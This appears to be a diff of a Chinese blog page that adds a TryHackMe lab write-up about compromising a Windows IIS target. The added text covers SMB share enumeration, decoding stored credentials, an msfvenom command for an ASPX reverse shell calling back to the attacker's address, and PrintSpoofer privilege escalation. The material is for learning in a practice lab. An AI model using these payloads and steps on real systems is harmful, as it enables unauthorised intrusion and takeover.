@@ -35,8 +35,23 @@
 <meta property="og:image" content="https://pic.imgdb.cn/item/66ebf02ff21886ccc0d19bd4.png">
 <meta property="og:image" content="https://pic.imgdb.cn/item/66ebf046f21886ccc0d1ad97.png">
 <meta property="og:image" content="https://pic.imgdb.cn/item/66ebf284f21886ccc0d38f7f.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee3d5ef21886ccc0d8365d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee3e09f21886ccc0d8bf99.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee3f5df21886ccc0d9df86.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee6e00f21886ccc00d6df8.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee6f1af21886ccc00e8d62.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee7a61f21886ccc01abf74.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee770ef21886ccc01785eb.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee7870f21886ccc018f6cf.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee78d8f21886ccc019557f.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee8028f21886ccc02079d3.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee822ff21886ccc02279f6.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee83fbf21886ccc0245b59.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee848cf21886ccc024ed72.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee8625f21886ccc0267ed8.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66ee8962f21886ccc029ae04.png">
 <meta property="article:published_time" content="2024-09-19T05:10:00.000Z">
-<meta property="article:modified_time" content="2024-09-19T09:45:25.062Z">
+<meta property="article:modified_time" content="2024-09-21T09:05:55.682Z">
 <meta property="article:author" content="noone___">
 <meta property="article:tag" content="THM">
 <meta property="article:tag" content="靶场">
@@ -236,10 +251,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-09-19 13:10:00 / 修改时间：17:45:25" itemprop="dateCreated datePublished" datetime="2024-09-19T13:10:00+08:00">2024-09-19</time>
+              <time title="创建时间：2024-09-19 13:10:00" itemprop="dateCreated datePublished" datetime="2024-09-19T13:10:00+08:00">2024-09-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-21 17:05:55" itemprop="dateModified" datetime="2024-09-21T17:05:55+08:00">2024-09-21</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -275,8 +296,59 @@
 <p>  <img src="https://pic.imgdb.cn/item/66ebf046f21886ccc0d1ad97.png" alt=""></p>
 <p>  <code>80</code> 端口是一个 <code>IIS10.0</code> ，扫了下网站啥都没有</p>
 <p>  <img src="https://pic.imgdb.cn/item/66ebf284f21886ccc0d38f7f.png" alt=""></p>
+<p>  这个b靶机÷完了，坐了一天牢发现是 <code>nmap</code> 命令不对，然后就这样，扫出来不同结果：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee3d5ef21886ccc0d8365d.png" alt=""></p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee3e09f21886ccc0d8bf99.png" alt=""></p>
+<p>  扫出来多余三个端口，在针对这几个端口详细扫描：</p>
+<p>  然后我详细信息又扫不出来了：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee3f5df21886ccc0d9df86.png" alt=""></p>
+<p>  睡了一觉又出来了，可能是靶机的问题：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee6e00f21886ccc00d6df8.png" alt=""></p>
+<p>  看到 <code>49663</code> 也有 <code>IIS</code> 服务器，继续扫一下看看，只找到一个空的目录：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee6f1af21886ccc00e8d62.png" alt=""></p>
+<p>  这里有个要注意的地方，用 <code>gobuster</code> 的 <code>medium</code> 字典是能扫出来东西的(大概扫了有 $40$ 分钟吧，很难想象实战中该怎么办)：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee7a61f21886ccc01abf74.png" alt=""></p>
+<blockquote>
+<p>/nt4wrksv</p>
+</blockquote>
+<p>  然后根据 <code>wp</code> 可以用 <code>nmap</code> 的 <code>--script=vuln</code> 参数来用脚本扫描，扫了 $20$ 分钟后看到有永恒之蓝</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee770ef21886ccc01785eb.png" alt=""></p>
+<p>  但让尽可能不用 <code>msf</code> 就先不用了</p>
+<p>  <del>那就先裸连一下 <code>smb</code> 好了</del> 连是连不上，但是可以空密码列举共享的资源：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee7870f21886ccc018f6cf.png" alt=""></p>
+<p>  看到了一个奇怪的东西，连一下试试：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee78d8f21886ccc019557f.png" alt=""></p>
+<p>  文件内容是：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[User Passwords - Encoded]</span><br><span class="line">Qm9iIC0gIVBAJCRXMHJEITEyMw==</span><br><span class="line">QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk</span><br></pre></td></tr></table></figure>
+<p>  这个等号看着像 <code>base64</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bob - !P@$$W0rD!123</span><br><span class="line">Bill - Juw4nnaM4n420696969!$$$</span><br></pre></td></tr></table></figure>
+<p>  当然这个也可以从浏览器访问到：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee8028f21886ccc02079d3.png" alt=""></p>
+</li>
+<li><p><code>smb</code> 传反弹 <code>shell</code></p>
+<p>  现在基础的工作已经做完了，目前有两个人的账号密码，<code>smb</code> 特定目录的文件权限且该目录能从浏览器访问到</p>
+<p>  账密目前不能登录 <code>smb</code> ，而且传反弹 <code>shell</code> 的条件已经全了，就先传 <code>shell</code> 上去。</p>
+<p>  这里不能用 <code>msf</code> 就用正常的反弹了</p>
+<p>  这里刚刚看 <code>smb</code> 文件的时候好像没正常断开导致 <code>smb</code> 连不上了，所以后面的靶机 <code>ip</code> 又改了（大嘘</p>
+<p>  注意这个是 <code>windows</code> 的，别拿那个blinux的反弹 <code>shell</code> 传了，还有要生成 <code>.aspx</code> 的反弹 <code>shell</code> 而非 <code>.asp</code> ，原因是 <code>aspx</code> 会使用 <code>ASP.NET</code> 引擎来运行</p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee822ff21886ccc02279f6.png" alt=""></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.99 LPORT=443 -f aspx -o windows_rev_443.aspx</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/66ee83fbf21886ccc0245b59.png" alt=""></p>
+<p>  <code>dir /s /b c:\ | find &quot;user.txt&quot;</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee848cf21886ccc024ed72.png" alt=""></p>
+</li>
+<li><p><code>PrintSpoofer</code> 实现 <code>Windows</code> 提权</p>
+<p>  这里由于不能用 <code>msf</code> 就传不了 <code>PowerUp</code> ，仿照 <code>Alfred</code> 里面看下 <code>whoami /priv</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee8625f21886ccc0267ed8.png" alt=""></p>
+<p>  中间这个 <code>SeImpersonatePrivilege</code> 在 <code>Alfred</code> 里面被用来模拟用户 <code>token</code> ，但那次是用 <code>msf</code> 做的，这次要手动做了</p>
+<p>  来<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">这里下载PrintSpoofer.exe</a>并传上去</p>
+<p>  根据所说的，执行 <code>PrintSpoofer.exe -i -c cmd</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/66ee8962f21886ccc029ae04.png" alt=""></p>
+<p>  去 <code>/users/administrator/Desktop</code> 找到 <code>root.txt</code></p>
 </li>
 </ul>
+<p><del>啊不对啊我草，刚刚的账号密码怎么没用到</del></p>
+<p><del>看了一圈也没有利用到这个的，可能只是用来转移视线的</del></p>
 
     </div>
 
@@ -317,7 +389,10 @@
     <a href="/2024/09/15/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%848%EF%BC%9AOverpass2-hacked/" rel="prev" title="THM打靶日寄8-Overpass2-hacked">
       <i class="fa fa-chevron-left"></i> THM打靶日寄8-Overpass2-hacked
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2024/09/20/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8410%EF%BC%9AInternal(%E6%90%81%E7%BD%AE%EF%BC%8C%E9%9D%B6%E6%9C%BA%E5%A5%BD%E5%83%8F%E6%9C%89%E9%97%AE%E9%A2%98)/" rel="next" title="THM打靶日寄10-Internal(搁置，靶机好像有问题)">
+      THM打靶日寄10-Internal(搁置，靶机好像有问题) <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -392,7 +467,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">118</span>
+          <span class="site-state-item-count">126</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -405,7 +480,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">77</span>
+        <span class="site-state-item-count">78</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
